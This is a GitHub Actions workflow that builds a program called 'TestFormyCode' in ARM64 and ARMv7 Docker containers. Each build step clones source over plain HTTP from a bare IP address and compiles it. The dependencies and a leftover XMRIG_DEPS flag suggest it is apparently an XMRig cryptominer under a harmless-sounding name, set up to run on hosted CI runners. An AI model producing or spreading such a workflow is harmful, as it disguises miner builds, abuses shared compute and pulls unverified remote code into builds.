name: Build TestFormyCode for ARM

on:
  push:
    branches:
      - master
  workflow_dispatch:  # 允许手动触发

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Check out repository
        uses: actions/checkout@v2

      - name: Set up ARMv8 Docker container
        run: |
          docker pull arm64v8/ubuntu:18.04
          docker run --name arm64_build -d arm64v8/ubuntu:18.04 sleep infinity
          docker exec arm64_build apt-get update
          docker exec arm64_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y

      - name: Build TestFormyCode for ARMv8
        run: |
          docker exec arm64_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
          cd testformycode && \
          mkdir build && cd build && \
          cmake .. -DBUILD_STATIC=ON -DARM_TARGET=8 -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ && \
          make -j\$(nproc) && \
          mv testformycode ~ && \
          cd ~ && rm -rf testformycode"

      - name: Set up ARMv7 Docker container
        run: |
          docker pull arm32v7/ubuntu:18.04
          docker run --name arm32_build -d arm32v7/ubuntu:18.04 sleep infinity
          docker exec arm32_build apt-get update
          docker exec arm32_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y

      - name: Build TestFormyCode for ARMv7
        run: |
          docker exec arm32_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
          cd testformycode && \
          mkdir build && cd build && \
          cmake .. -DARM_TARGET=7 -DXMRIG_DEPS=../scripts/deps && \
          make -j\$(nproc) && \
          mv testformycode ~ && \
          cd ~ && rm -rf testformycode"

      - name: Cleanup
        run: |
          docker stop arm64_build
          docker rm arm64_build
          docker stop arm32_build
          docker rm arm32_build
